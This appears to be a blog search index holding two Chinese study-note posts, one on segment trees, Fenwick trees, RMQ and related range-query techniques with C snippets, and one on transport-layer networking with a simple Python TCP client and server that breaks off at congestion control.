<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Data Structure Note(I) —— segment tree]]></title>
    <url>%2F2019%2F05%2F14%2Fdata-structure1%2F</url>
    <content type="text"><![CDATA[prologue 这是数据结构大杂烩系列的第一篇文章。这个系列主要将记录自己在学习数据结构方面的一些笔记等，以加深自己对数据结构的认识。(不知道能不能坚持做下去 在维基百科中，是这样介绍数据结构的： In computer science, a data structure is a data organization, management, and storage format that enables efficient access and modification. More precisely, a data structure is a collection of data values, the relationships among them, and the functions or operations that can be applied to the data. 数据结构作为计算机中一个不可分割的重要组成部分，应用十分广泛，几乎在绝大多数的代码中我们都能见到它的身影——链表，栈，队列，树等等。下面就让我们一起来学习一些基础的数据结构吧！ 今天的主题是segment tree，也就是线段树！ a simple problem 在正式学习线段树相关的问题之前，我们先来考虑以下一个问题。 给定一个数组n，然后有n个询问，每个询问包含两个值L和R，我们需要求出在区间[L,R]内所有的元素的和(乘积)。 最直接的，我们知道，可以直接起手一个for循环，直接遍历累加即可。好吧，那么这个时候如果n的大小为200000，且有m个询问，复杂度可是O(nm)了，这样的复杂度还能接受吗？作为一个软件工程师，我们当然是不能接受的。那么怎么办呢？ 这时候你可能要认为，那就用线段树吧，今天的主题。但是，我拒绝！ 就这个问题来说，我们不需要使用什么数据结构，只需要开一个新的sum数组，对前缀和做一个累加(累乘，不考虑溢出)，然后，我们只需要用sum[R]-sum[L-1]即可得到区间[L,R]的累加值了。 这个时候，又来了一个问题，现在我需要修改某一个点x了，这该怎么办呢？直接更新sum[1]~sum[x-1]显然是不行的，这样的效率也太低了，这种方法就做不下去了。这样，我们就引入了一种新的数据结构，叫线段树。 what is a segment tree 从名字我们其实就可以猜到它是干什么的。线段树首先是一颗树，而且还是一棵完全二叉树(此处不予证明)。并且，每一个叶子结点的值包含着某一个线段(区间)的一些信息。这就是线段树。这么说可能还有点难以理解，下面我们以一个长度为7的数组[3,4,1,6,7,5,2]为例子，来看下一颗线段树长什么样子。 这就是一颗简单的线段树。每个节点包含的区间长度大于1时，则会分裂出子节点，直到长度为1。其中，左儿子为包含的为左半区间，右儿子包含的为右半区间，并且，同一层之间所有节点包含的区间的并集为恰好为整个区间(满二叉树下)，且各节点包含的区间之间没有任何重叠。 123456struct seg_node &#123; int l, r; // 该节点包含的区间为区间[l,r] int sum; // 区间的和 int maxn, minn; // 区间的最大值和最小值 ...&#125; tree[N]; how to build a segment tree 构建一颗线段树的话，简单来说就两个字，二分！对于每一个区间[L,R]，当R！=L时，就分裂出子节点，分界为mid。这样，我们就得到了一颗用于求区间和的二叉树。注意到线段树的特性使得对下标为n的节点，左儿子的下标为2n，右儿子的下标为2n+1123456789101112131415#define lson(d) (d&lt;&lt;1)#define rson(d) (d&lt;&lt;1|1)int a[8] = [0,3,4,1,6,7,5,2]; // 数组下标是从0开始的，这里为了方便补一个0void build(int d, int l, int r) &#123; tree[d].l = l; tree[d].r = r; if (l == r) &#123; // 叶子节点时结束递归。并且赋值 tree[d].sum = a[l]; return; &#125; int mid = (l+r)&gt;&gt;1; build(lson(d),l,mid); build(rson(d),mid+1,r); tree[d].sum = tree[lson(d)].sum + tree[rson(d)].sum; // 别忘了递归完后要进行值的合并&#125; segment tree’s operationsearch one leaf 如果我们需要查找某一个节点,我们可以这样来写(其实就是一个二分查找)：1234567void search(int d, int x) &#123; int l = tree[d].l, r = tree[d].r; if (l == r) return tree[d].x; int mid = (l+r)&gt;&gt;1; if (x &lt;= mid) return search(lson(d),x); else return search(rson(d),x);&#125; 看到这里，我想也许你会有一个疑问，这样写的话，查找单个点的复杂度不就变成了O(logn)了吗？这效率不是变低了吗？是的，查找一个点的话，效率确实变低了。然而，线段树最大的优势在于区间上！ query 接下来这里就是重头戏了，在查找一个区间的时候，我们这样来写：123456789101112// 查询[L,R]区间和int query(int d, int L, int R) &#123; int l = tree[d].l, r = tree[d].r; if (L &lt;= l &amp;&amp; r &lt;= R) &#123; return tree[d].sum; // 当所查找的区间完全覆盖当前节点时，直接返回！ &#125; int mid = (l+r)&gt;&gt;1; int ans = 0; if (L &lt;= mid) ans += query(lson(d),L,R); // 查找的区间覆盖到左区间时，往左找 if (R &gt; mid) ans += query(rson(d),L,R); // 查找的区间覆盖到右区间时，往右找 return ans;&#125; 下面还是以那个数组为例，看一下查找区间[3,5]的时候会发生些什么(红色的线为查询过程中经过的路径)。 同样的，区间查找也可以用于维护区间的乘积以及最大值和最小值。 可以证明，线段树的区间查询复杂度为O(logn)，简单的证明如下： 由前面我们知道，含n个元素的线段树最多为logn+1层。目标证明每一层需要考察的节点数不会超过4个。 假设现在在[l,r]区间内查询[L,R]。在当前层内，考察的节点数为2(左右儿子)。当[L,R]仅覆盖左子区间或右子区间时，递归进入对应区间，下一层考察的节点数仍为2，回到证明2。当同时覆盖左子区间和右子区间时，下一层考察的节点数为4，进入证明3。 将左子区间的左右儿子记为左1和左2，右子区间的左右儿子记为右1和右2。由于区间的连续性和不相交性，查询区间必定覆盖左2和右1，若该区间没有覆盖左1和右2，则下一层需要考察的节点仍然为4个。若区间覆盖了左1，则必然覆盖了左2整个区间，左2不再递归；若区间覆盖了右2，则必然覆盖了右1整个区间，右1不再递归，则下一层需要考察的节点仍然不超过4个。 另外一种大致的证明思路是，把当前查询区间[L,R]分为n个子区间，且每一个子区间的长度都是2的整数次幂，即N = 2k0+2k1+…+2kn。且不存在连续的3个k的值相同(若存在，由区间的连续性，则有其中的两个k可以并成一个更大k，矛盾)，故n&lt;=2logN。并且，k的值只能先减小后增大，不会出现两次减小的情况。此时，可以得到每一层需要获取sum的节点数必为常数，最后的时间复杂度级别仍然为O(logn)。 change one leaf 尽管前面我们已经能够求得在logn的复杂度情况下求得区间和了，但如果需要修改的话，线段树做的到吗？答案显而易见。当要更改某一个节点时，只需要按照逐层深入，修改某个节点即可,记得修改完后更新父亲节点的值即可。1234567891011void update(int d, int x) &#123; int l = tree[d].l, r = tree[d].r; if (l == r) &#123; tree[d].sum = x; return; &#125; int mid = (l+r)&gt;&gt;1; if (x &lt;= mid) update(lson(d),x); else update(rson(d),x); tree[d].sum = tree[lson(d)].sum + tree[rson(d)].sum;&#125; lazy tag 既然前面我们考虑到了改变某个节点，现在如果要更新某个区间呢？线段树又该怎么处理呢？ 最直接的办法就是逐点更新，这样的处理明显是不行的，但是如果要一次性更新那么多个节点，别说复杂度高达O(mn)，栈也很有可能会爆掉。那么我们有什么好办法呢？ 注意到一个细节，我们是不是可以不用更新那么多个节点呢？如果只更新少量节点的话，复杂度就可以下降了吧？比如现在在维护一个区间和，然后当前区间为[3,4]，要更新的区间为[2,4]，那么我们是不是可以只要更新节点[3,4]就行了，它的子节点暂时不去管，这样，如果需要查询区间[3,4]，我们也能给出正确的答案，只有当需要请求到[3,3]节点的时候我们再去更新它。如下图： 核心代码如下：1234567891011121314151617181920212223242526272829303132333435363738394041struct segment_tree &#123; int l, r; long long v, tag; // tag为惰性标记，v为区间和&#125; tree[N];/* pushdown为线段树的关键操作，作用是将惰性标记从父节点传递到子节点。注意一下，当打上标记tag的时候，说明当前节点的更新已经完成，但是子节点的值还没有更新。传递的时候就更新子节点，然后子节点打上标记(子节点的子节点待更新)，并且把当前节点的标记清零，说明子节点的更新已经完成。*/void pushdown(int d) &#123; int l = tree[d].l, r = tree[d].r; int tag = tree[d].tag, mid = (l+r)&gt;&gt;1; tree[d].tag = 0; tree[lson(d)].v += (mid - l + 1) * tag; tree[rson(d)].v += (r - mid) * tag; tree[lson(d)].tag += tag; tree[rson(d)].tag += tag;&#125;void update(int d, int L, int R, int v) &#123; int l = tree[d].l, r = tree[d].r; if (L &lt;= l &amp;&amp; r &lt;= R) &#123; tree[d].tag += v; tree[d].v += (long long) v * (r - l + 1); return; &#125; if (tree[d].tag) pushdown(d); // 注意，这行代码不能漏掉，否则会导致当前节点得到的值不是真实值 int mid = (l+r)&gt;&gt;1; if (L &lt;= mid) update(lson(d), L, R, v); if (R &gt; mid) update(rson(d), L, R, v); tree[d].v = tree[lson(d)].v + tree[rson(d)].v;&#125;long long query(int d, int L, int R) &#123; int l = tree[d].l, r = tree[d].r; if (L &lt;= l &amp;&amp; r &lt;= R) return tree[d].v; if (tree[d].tag) pushdown(d); // 注意，当想要查询子区间时，需要先进行更新！ int mid = (l+r)&gt;&gt;1; if (R &lt;= mid) return query(lson(d), L, R); else if (L &gt; mid) return query(rson(d), L, R); else return query(lson(d), L, R) + query(rson(d), L, R);&#125; 线段树一个比较大的难点就在于惰性标记的设置上，一不小心很容易犯错，且通常情况下这种错误很难肉眼直接看出来(笔者就曾经因为惰性标记卡了好久)。这个还是建议做一下题，基本上就可以很好地掌握了。推荐codevs上面的线段树系列。 double lazy tag 好了，如果到这里你都能看懂的话，现在难度又要提高了。如果我们的区间更新中，既包括加法，又包括乘法，那该怎么办呢？这样的话，上面的lazy tag做法似乎就存在一些问题了。 一个可行的解法是，如果一个lazy tag不行，那就来两个！这样貌似没什么问题，可细细想想，问题老多了。首先，如果有两个tag，一个表示加法，一个表示乘法，那么在传递的时候，我们应该先将哪一个传递下去呢？比如这个时候如果我们对整个区间做了一个加法，又做了一个乘法，再做了一个加法，那这样的话不久乱套了吗？ 为了顺利解决不同的tag之间的冲突，我们必须为tag定一个先后顺序。 让我们先来考虑这样的情况。假设当前区间的和为x，共n个元素，现在依次做一个区间加法a，一个区间乘法b，再来一个区间加法c。 如果我们先把加法传递下去。那么第一步打上加法标记a，接下来做区间乘法，打上乘法标记b，再做区间加法，加法标记变为a+c。这个时候进行一次pushdown操作，由于加法优先，子节点(和为x,元素数量为n)从x变为b(x+(a+c)*n)，显然是不对的。如果要使最后的答案变得正确，我们需要把c修正为c/b。这就带来了很多麻烦了。 如果我们先把乘法传递下去。一开始打上加法标记a，后面在打上乘法标记b的时候，把加法标记变成ab，最后加上c的时候，加法标记变为ab+c(注意到b*(x+a)+c = bx+ab+c)。即我们需要做的，就是在处理区间做乘法的时候，同时对加法标记做一次乘法，在处理区间做加法的时候，只需要更新加法标记即可。核心代码如下：12345678910111213141516171819202122232425262728struct seg_tree &#123; int l, r; long long v, add_tag, mul_tag;&#125; tree[N];void pushdown(int d) &#123; int l = tree[d].l, r = tree[d].r; int lson = lson(d), rson = rson(d); int mid = (l+r)&gt;&gt;1; if (tree[d].mul_tag != 1) &#123; long long v = tree[d].mul_tag; // 下面取模是题目需要，如果题目保证不溢出，则可省去 tree[lson].add_tag = (tree[lson].add_tag * v) % mod; tree[rson].add_tag = (tree[rson].add_tag * v) % mod; tree[lson].mul_tag = (tree[lson].mul_tag * v) % mod; tree[rson].mul_tag = (tree[rson].mul_tag * v) % mod; tree[lson].v = (tree[lson].v * v) % mod; tree[rson].v = (tree[rson].v * v) % mod; tree[d].mul_tag = 1; // 注意到乘法标记的初始值应该为1，即乘法运算的单位元 &#125; if (tree[d].add_tag) &#123; long long v = tree[d].add_tag; tree[lson].add_tag = (tree[lson].add_tag + v) % mod; tree[rson].add_tag = (tree[rson].add_tag + v) % mod; tree[lson].v = ((mid - l + 1) * v + tree[lson].v) % mod; tree[rson].v = ((r - mid) * v + tree[rson].v) % mod; tree[d].add_tag = 0; &#125;&#125; 当然，如果现在题目不是要求同时做加法和乘法，而是进行set操作(将区间所有值变为一个确定的值，见codevs的线段树练习题)，那么我们的策略也要进行对应的更改，这里不再赘述。另外，说一个题外话，如果有三个或以上的区间操作呢？大体的思路还是一样的，即在保证各个tag不相互冲突的前提下将tag传递到子节点即可。相信聪明的你一定能找到对应的解决办法的。 Binary Indexed Tree 前面我们谈到了用线段树去实现区间的修改和查询。但是除去线段树的话，还有没有什么比较好的办法呢？答案肯定是有的，它的名字叫做树状数组。不过，与其说是树状数组，它的英文名字更能体现出它的思想。树状数组的每一个位置存放的是一个区间的值，而不是一个点，其直观表现图如下： prepare 要实现树状数组，首先，必须要理解lowbit函数，具体如下：123int lowbit(int x) &#123; return x&amp;-x;&#125; 尽管只有短短一行代码，理解起来还是有一定难度的。这个函数的作用是取得二进制下x的最小的1所在的位置对应的值。这样说起来有点绕口。举个例子，x=10100100(2)，这个时候x最右的一个1在第三位，对应的值为100(2)。我们可以验证一下，-x = 01011100(2)，x&amp;-x = 100。具体证明此处省略。 在理解了lowbit函数后，我们就可以观察上面的图，我们可以看出，每一个点保存的其实就是(x-lowbit(x),x]区间的数字的和。 query 理解好了树状数组的结构后，我们来看一下应该怎样对区间进行求和。首先，我们给定x，我们考虑如何求[1,x]区间上所有数字的和。代码很简单，见下：12345678910#define lowbit(x) (x&amp;-x)// sum[i]为树状数组int query(int x) &#123; int ans = 0; while(x) &#123; ans += sum[x]; x -= lowbit(x); &#125; return ans;&#125; 为什么上面的代码能起作用呢？如果当前我们要查找[1,7]的区间和，那么，由上面的函数，我们可以得到ans = sum[7] + sum[6] + sum[4]。不难看出，对于[1,x]的区间求和的问题，我们可以划分为[1,x-lowbit(x)]和[x-lowbit(x)+1,x]的和两个子问题，而由树状数组的结构，我们有[x-lowbit(x)+1,x]的区间和为sum(x)，这个时候，整个问题就变成只需要求[1, x-lowbit(x)]的值的问题了。这样不断递归下去，最终，当x是2的整数次幂的时候，sum[x]表示的恰好就是[1,x]的值，函数退出，我们成功地求出了前缀和！ 当我们能求出前缀和的时候，剩下的问题就很简单了。当我们需要求[l,r]的值的时候，我们只需要求query(r)-query(l-1)的值即可。 update 我们先来考虑更新一个点的情况。要更新一个点，我们需要同时更新其“父”节点，对于树状数组而言，该节点对应的下标为x+lowbit(x)。由此，我们可以得到以下的函数：12345678// n 为数组元素的个数// 注意，对于这种结构的树状数组来说，把点d从a变成b的时候，我们的更新是相当于加了一个差值，即update(d, b-a)void update(int x, int v) &#123; while (x &lt;= n) &#123; sum[x] += v; x += lowbit(x); &#125;&#125; 那么，接下来我们考虑该如何进行区间的更新呢？ … … 惊了！我们发现，按照我们目前的思路，除了单个点逐步暴力地更新之外，我们发现竟然没有别的什么好办法。那怎么办？这个博客就不写了吗？ 不，我还是拒绝！ 其实，想要进行区间的更新还是有办法的，但是我们的数组存放的“东西”得改一改了(见codevs中线段树练习2)。 这里简单的讲一下这道题的意思，就是n个数，m个操作，其中，共有两种操作类型，其一是进行区间的更新(加上某个值)，其二是进行单点的查询。在这样的一个背景下，我们可以使用线段树来完成这个要求。 具体来说，对于原先的数组a[N]，我们新建一个数组sum[N]，并且，sum[N]是一个树状数组，保存的是相对与初始值的变化量，初始为空。接下来，更新的操作比较神奇。假设我们要在区间[l,r]上，每个数都加上n。我们知道，下标为x的数字，当且仅当l&lt;=x&lt;=r时，即在区间内时，这个数字需要加上n。这个时候，我们就可以在下标为l的地方加上标记n，在下标为r+1的地方打上标记-n，这样，在单点查询下标为x的位置的值的时候，我们的问题就可以转化为一个区间求值的问题了。如果还是不太理解，请看下图： advantage &amp; limitation 由上面的介绍，我们其实可以看得出来，树状数组虽然理解起来稍微困难一些，但是代码量是很小的，而且也很难出现一些隐蔽的bug，这对与经常写出bug的程序猿(比如笔者)来说，还是很友好的。并且，时间上，树状数组进行区间查询和单点修改的操作的复杂度为O(logn)，且常数极小，因此在树状数组适用的情景下，其效率是线段树的好几倍(线段树由于存在函数的递归，以及lazy tag的pushdown操作，常数是很大的)。空间上，树状数组通常不需要额外的存储空间，其空间复杂度为O(n)，而线段树通常需要2n~4n的空间，这使得线段树显得过于“笨重”。 但是，树状数组的特性也决定了它具有很大的局限性——由上面我们知道，树状数组比较适合用来做区间的查询和单点的更新数量较多的操作，但是无法进行区间的修改。尽管后面的版本我们通过记录区间边界使得树状数组可以进行区间的修改，但同时，无法进行区间的查询，这是相对的。因此，尽管树状数组确实很好用，但应用范围比较狭窄。可以说，树状数组可以实现的东西，线段树都可以实现，然而线段树可以实现的东西，很多情况下树状数组却实现不了。当然，在能用树状数组实现的情形下，还是推荐用树状数组好。 另外，关于树状数组和线段树的使用情形，看过一句话说得挺精辟的。在离散数学的观点下，线段树适用于含幺半群(即满足结合律，且有单位元)，而树状数组仅适用于交换群(必须满足结合律，交换律，且含有单位元，以及每个元素均存在逆元)。故树状数组适用范围更小一些。 block(?) algorithm 也许上面提供的两种区间的结构化查询你都不够满意，现在，还有一种十分暴力的写法，它的名字叫做”分块”。这种做法就是完全暴力的进行处理，它能处理基本上所有线段树能处理的问题，并且，对于线段树处理不了的某些问题，它竟然也能够处理！那么，我们就来看一看分块是什么吧。 现在，我们来考虑下这个问题(codevs的线段树练习4加强版)： 给一个序列，含有n个元素(1&lt;=n&lt;=200000)，要求实现m个操作，共两种类型，第一种是区间每一个数都加上n，第二种是查询区间内有多少个数是k的倍数。其中，1&lt;=k&lt;=200000，1&lt;=m&lt;=200000 看到k的取值范围这么大，瞬间慌了，这不就是不想让我用线段树吗？每个节点保存20w个数字，怎么可能？因此，忍无可忍的情况下，我们决定暴力做了。 首先，很明显如果我们要直接便利的话，复杂度还是太高了，最坏情况下达到O(mn)，这不行。那么，我们能否参考一下使用线段树的思路呢？具体来说，我们也可以考虑一下将区间分成一个个的小块，然后，维护每一个块上值为1~200000的倍数的数字的数量，这样就可以解决了！ 以n=200000，1&lt;=k&lt;=200000为例，我们取每一个块的大小为500，那么总共就有400个块，每一个块上维护的话需要400*200000大小的数组。这已经很极限了。当我们需要将区间[l,r]值增加n的时候，按照一下步骤： l和r在同一个块里面的时候，则r-l&lt;500，我们直接暴力for循环增加即可。 当l和r不在同一个块的时候，不妨假设l所在的块为x1&lt;=l&lt;=x2，r所在的块的范围为x3&lt;=r&lt;=x4，则我们需要for循环更新位于[l,x2]和[x3,r]的所有点的值，并且，将位于x2和x3之间的所有块全部加上标记n即可。这样的话，最坏情况下，复杂度也是近似于O(sqrt(n))。 同样的，在进行区间内查询的时候，假设查询[l,r]区间内k的倍数的个数，按照以下步骤： l和r在同一个块里面，直接暴力求解 l和r不在同一个块里面，则同样假设l所在的块为x1&lt;=l&lt;=x2，r所在的块的范围为x3&lt;=r&lt;=x4。则我们只需要for循环遍历位于[l,x2]和[x3,r]的所有点，看下该值加上当前块的标记值结果是否是k的倍数即可复杂度为O(sqrt(n))。对于位于[x2,x3]内所有的块，假设当前的块标记值为c，则我们只需要查看数组中(k-c)的值即可，复杂度同样为O(sqrt(n))。 本质上，这样的分块算法其实相当于一颗高度为3的树，其中，每个非叶子节点的孩子的个数近似为sqrt(n)个。整个问题而言，最后的总复杂度为O(m*sqrt(n))。 当然，这道题本身应该有比较优秀的做法，这里只是提一下分块这样的一种思想，在处理一些十分棘手的问题，并且实在想不出什么好的问题的时候，不妨试一试吧。这里顺便说一句题外话，如果是静态的序列，想多次查找某个值是否是k的倍数的话，有一个叫做莫队算法的神奇的东西(好像就是一位叫莫涛的选手发明的)，本质上也是用到了分块的思想。 Range minimum query (RMQ) 前面我们提到，树状数组无法实现对于区间的求最值问题，是因为max和min运算不存在逆元。现在，如果我们想求区间的最大值最小值，但又觉得线段树太慢，有没有什么能像树状数组一样快的东西呢？结论是有的！(当然，这种算法不适用于动态更新的序列 detail ST-RMQ算法本质上应该算是动态规划类，它的优秀之处在于，对于一个给定的序列，它只需要O(nlogn)的复杂度进行初始化，此后，能以O(1)的复杂度解决区间最值的求解问题。在一个2^n长度的数组中，对于一个坐标为x的点，我们可以保存以其为起点，且区间长度为2k的区间的最值。在动态规划的思想中，我们使用F[Bit][Pos]来表示起点位于Pos，且长度为2Bit的区间的最值。这个时候，求解的状态转移方程如下： F[bit][p] = max(F[bit-1][p], F[bit-1][p+(1&lt;&lt;(bit-1))]); 即对于长度为b = 2bit的区间来说，该区间的最大值等于两个子区间中最大值更大的那一个。当然，也许你会问，如果仅仅能得到长度为2的幂次的区间的最值，那有什么用？通常情况下，我们遇到的区间的大小都不会是2的幂次。这里有一个比较巧妙的操作。令len是小于等于区间长度的最大的2的幂次，则整个区间的最大值为max(F[bit][l],F[bit][r-len+1]) 核心代码如下：12345678910111213// 初始化操作// max_bit 表示小于等于区间长度的最大的2的幂，下面的bit同理for (int i = 1; i &lt;= max_bit; i++)for (int j = 1; j &lt;= n; j++) &#123; if (j + (1&lt;&lt;i) - 1 &gt; n) break; // 超过区间的右侧时退出 int len = 1&lt;&lt;(i-1); F[i][j] = max(F[i-1][j], F[i-1][j+len]); // 状态转移方程 printf("F[%d][%d]=%d\n", i, j, F[i][j]);&#125;// 获取区间[l,r]上的最大值bit = getLen(r-l+1);printf("%d\n", max(F[bit][l], F[bit][r-(1&lt;&lt;bit)+1])) application of setment segment tree 前面我们一开始谈到了，线段树是很厉害的，很多事情都可以做。然而，后面我们又枚举了一大堆在比较特殊的情况下，效率比线段树更优的结构，这不是明显打脸吗？现在，我们来看一下线段树究竟可以干一些什么其他的一些结构做不了的事情吧。 discretization 为了讲接下来的一个例子，我们需要先提到一个概念——离散化。这是一个很神奇的词汇，它可以将一些看似十分困难的题目转化为一些简单的情形。尽管举的例子不太恰当，但我们还是来看一下下面的一种情形吧。 通常情况下，我们建线段树的时候是以数组的下标为叶子节点建立的，比如数组有n个元素，则线段树的叶子节点数量为n。假设我们现在要以值的大小为节点建一个线段树，比如值域为[1,200000]，则线段树有20w个叶子节点，但是，如果值域变为了[1,20000000]，然后元素的个数仅有10000个，这个时候，我们总不可能建一个叶子节点数为20000000的线段树吧。这个时候，我们就需要用到离散化的思想了。 离散化思想的本质是，将一个无限大小(或特别大)的空间映射到一个较小的空间。比如下面的函数就类似于一个离散化的过程： 再回来考虑我们前面建立线段树的过程，由于只有10000个节点，而值域为[1,20000000]，我们知道各个节点的值的分布是十分“松散”的。这个时候我们就可以使用离散化，具体步骤是将10000个节点按照大小排序，假设排序后的数组为a0,a1…an，这个时候我们取一个映射：a0-&gt;1,a2-&gt;2…an-&gt;n，这样的话，我们就成功地将一个值域为[1,20000000]的离散区域映射到一个[1,10000]的分布较为紧密的区域当中了，这就是离散化。 scan line algorithm 这里要介绍的，就是大名鼎鼎的扫描线算法……..的简单版。这就是一个很典型的线段树的应用问题。 由于这个笔记的篇幅有点长，这里就不再贴代码了。主要讲一讲相关的思路。为了引入扫描线算法，我们先来看下扫描线算法的一道裸题。 给定一个平面上的n个矩形，求n个矩形的并覆盖到的面积的大小 扫描线算法的核心思想在于“扫描”两字，即用一条“扫描线”遍历一整个平面区域。这里，我们假设扫描线与x轴垂直。由于x是递增的，这个时候我们将每一个矩形的两个y轴坐标扔进数组中，进行排序并离散化，映射到一个值域为2n的数组(每一个矩形有两个y坐标)当中，得到2n-1条边，经过去重后，以各条边为叶子节点建立线段树，维护区间的覆盖问题。(其实，关于这里y轴的维护具体实现办法有很多种，比如也可以以每一个y坐标为叶子结点，但实现起来很麻烦，最后还是归结到边的覆盖问题) 接下来，具体的做法是： 将扫描线从最左侧开始扫描，在第一次与矩形的边界重合的时候停下。 如果遇到的是左边界，则说明该区间被覆盖。如果遇到的是右边界，则说明该区间不再被对应的某个矩形覆盖。并且更新线段树。 继续往右扫描，直到遇到边界，假设此时前进了deltaX，则当前答案加上deltaX乘上线段树中区间覆盖的面积，再进入2。直到到达最后一条边，结束循环。 如果还是不太理解，建议结合下面的图看一下。其中，红色为扫描线，深蓝色表示该边当前已覆盖，浅蓝色表示该边已覆盖。 这就是实现一个扫描线算法的简单思路，当然，具体实现过程中会有许许多多的小细节，各种边界问题什么的需要处理，难度还是比较大的。这里就不再进行叙述了。(毕竟这是数据结构的笔记，这里提到这个算法主要还是想提一下线段树的应用） epilogue 到这里，我们的数据结构大杂烩系列的第一篇文章就结束了。这里总结一下这篇文章讲的内容吧。首先，由一个简单的问题，我们引入了线段树，并且，讲到了线段树是如何构建的，并且，它是如何实现单点/区间的更新和单点/区间的求和(乘积)，以及线段树的lazy tag思想。在此上拓展开来，我们又简单地提到了树状数组及其应用，这是一种效率很高但同时受限又很大的数据结构，并且我们比较了线段树和树状数组的特点。接下来，我们又讲到了分块算法，在不得已的情况下，我们可能只能采用分块来对区间进行维护，这是一种“暴力”解法的优化版本。接下来，从树状数组的弊端，我们又讲到了在线RMQ算法，这是一种用于多次求解一个固定序列的区间最值的算法，利用到了动态规划的思想。最后，再次回归到了主线，讲线段树的应用问题——扫描线算法，文章也到此结束。 由于是刚开始这个系列，感觉写起来还是很乱的，基本上是想到什么写什么，并且，详略上可能也存在一些小问题。这篇文章总共用了一天多的时间，大概是从早上十点多写到晚上十点多吧，第二天也花了好几个小时做一点修改。东西挺多，并且个人感觉也已经挺全面了，不过很多东西仅仅简单提及。当然，本身就不可能做到全面，但还是希望能继续加油吧。 预告——下一期应该还是会写和树相关的一些结构，敬请期待吧。]]></content>
      <categories>
        <category>Data Structure</category>
      </categories>
      <tags>
        <tag>Data Structure</tag>
        <tag>segment tree</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Network——Transport_layer]]></title>
    <url>%2F2019%2F03%2F27%2FNetwork%E2%80%94%E2%80%94Transport-layer%2F</url>
    <content type="text"><![CDATA[序 这篇系列主要是Computer Networking A Top-Down Approach的一些笔记和心得之类的东西。不过不知到能不能坚持下去。这篇文章主要是运输层相关的一些知识点的笔记。希望能加深自己对网络这块的理解。在经典的五层协议模型中，运输层位于应用层和网络层中间，为应用程序的进程之间的通信起着重要的作用。其中，我们重点研究的对象是运输层协议，包括TCP和UDP。 socket socket是不同端系统间进程通信的基本单位，是操作系统提供的进程间通讯机制。 主要方法有(以python为例)： 创建socket： socket = socket(AF_INET, SOCK_STREAM)，其中，第一个参数指定了IPv4协议，第二个参数指定了TCP协议。同样的，UDP协议的第二个参数为SOCK_DGRAM。函数返回建立的socket的文件描述符 发送或接收数据： socket.recv() (recv方法会阻塞) socket.send() 绑定某个端口： socket.bind()，若使用UDP协议发送数据，无需绑定端口Client： socket.connect() ，与某个socket建立连接，具体建立链接的过程由内核实现(如三次握手) 状态序列如下： Server： socket.listen() ，作用是通知内核，将该socket由主动套接字转化为被动套接字，处于LISTEN状态，此方法不阻塞。同时，内核为每个监听套接字两个队列： 未完成连接队列：收到了SYN，等待第三次握手，此时，socket的状态为SYN_RCVD。 已完成连接队列：三次握手过后，已建立连接，此时，socket状态为ESTABLISHED。 socket.accept()：内核从已完成连接的队列中取出socket，并为之分配相应的内存和文件描述符。如果已完成连接的队列为空，则进程被挂起，直到队列非空。 状态序列如下： Python下使用TCP协议实现简单的客户端和服务端：1234567891011121314151617181920// ClientclientSocket = socket(AF_INET, SOCK_STREAM)clientSocket.connect((serverName, serverPort))sentence = input('Input lowercase sentence:')clientSocket.send(sentence.encode())modifiedMessage = clientSocket.recv(1024)print('From Server: ', modifiedMessage.decode())clientSocket.close()// ServerserverSocket = socket(AF_INET, SOCK_STREAM)serverSocket.bind(('', serverPort))serverSocket.listen(1)print('The server is ready to receive')while True: connectionSocket, addr = serverSocket.accept() sentence = connectionSocket.recv(1024).decode() capitalizedSentenced = sentence.upper() connectionSocket.send(capitalizedSentenced.encode()) connectionSocket.close() UDP协议 UDP协议和TCP相比，有以下特点： UDP是一种无连接协议，端系统间不需要进行连接就可进行通信。因此，UDP时延较小。 UDP首部仅8字节，远远小于TCP。甚至我们可以在应用层基于UDP设计自己的协议。 UDP是一种不可靠的协议，它不能保证数据的按序，准确交付。 以下是UDP报文段的结构： TCP协议 TCP协议具有以下特点： 面向连接。端系统的进程在相互通信前，需要先进行三次握手，此后才能正式开始连接。(注意：TCP是一种抽象意义上的连接，其状态仅仅保存在两个对应的端系统当中，中间的网络元素不负责维持该连接状态) TCP连接提供的是全双工服务，即两个端系统直接可以直接相互发送信息。 TCP是可靠的运输协议，能保证数据的准确交付，但不能保证数据的按序，按时交付。 以下是TCP报文段的结构： 超时时间的估计 TCP通过超时/重传机制来处理报文段丢失问题。超时长度的限定比较复杂，具体公式如下： 我们可以通过每一次某报文段从发出到收到并确认所需的时间来估计，并且，直觉告诉我们，越近的一次RTT对和下一次传输的RTT的关系应该是比较紧密的，因此，我们可以选择维护一个EstimatedRTT值，每当获得一个新的SampleRTT时，则对其进行更新，具体规则如下： EstimatedRTT = (1 - a) * EstimatedRTT + a * SampleRTT 这种平均被称为指数加权移动平均，能比较好的估计出下一次RTT，其中a的推荐值为0.125。但是，我们超时间隔肯定是要比这个要大一些的。并且，为了尽量传输时延，同时，也要尽量减少不必要的重传，我们可以借助偏离值来估算。具体公式如下： DevRTT = (1 - b) * DevRTT + b * |EstimatedRTT - SampleRTT| 其中，b的推荐值为0.25。这样，我们可以大概估算出近几个包我们的估计值的误差大小，当这个误差比较大时，说明网络情况不是很好，有时发生了阻塞，这个时候我们应该稍微增大超时间隔，以适应网络的波动。于是，我们最终得到的超时重传时间计算公式如下： TimeoutInterval = EstimatedRTT + 4 * DevRTT 另外，在发生超时事件后，TCP将不再为超时的包计算RTT，同时，超时间隔加倍，这就提供了某种形式上的拥塞控制，当网络拥塞发生时，TCP会通过阻塞客户端发包的速率来避免加剧拥塞。 由于有时候超时周期比较长，一个报文段丢失后，要等很久才能重传，而后面的包由于窗口大小的限制无法发送，这就导致了时间的浪费。当接收到大于3个以上的冗余ACK的时候，说明接收方在该ACK后的一个包缺失，这时就会触发快速重传。 TCP拥塞控制算法 TCP采用的是拥塞窗口(cwnd)来限制发送方向其连接发送流量的。具体是，在发送方中，未被确认的数据量不会超过cwnd与rwnd中的最小值，即： LastByteSent - LastByteAcked &lt;= min {cwnd, rwnd} 我们知道，TCP仅存在与建立连接的两个端系统上，那么，TCP是如何检测网络拥塞的发生呢？答案是RTT。当发生丢包事件时，即告诉发送方：网络可能发生了拥塞，于是TCP就降低了发送速率。而当收到一个非冗余的ACK时，即告诉了发送方：当前网络通畅，可以继续发送。这是TCP拥塞控制基础。 慢启动 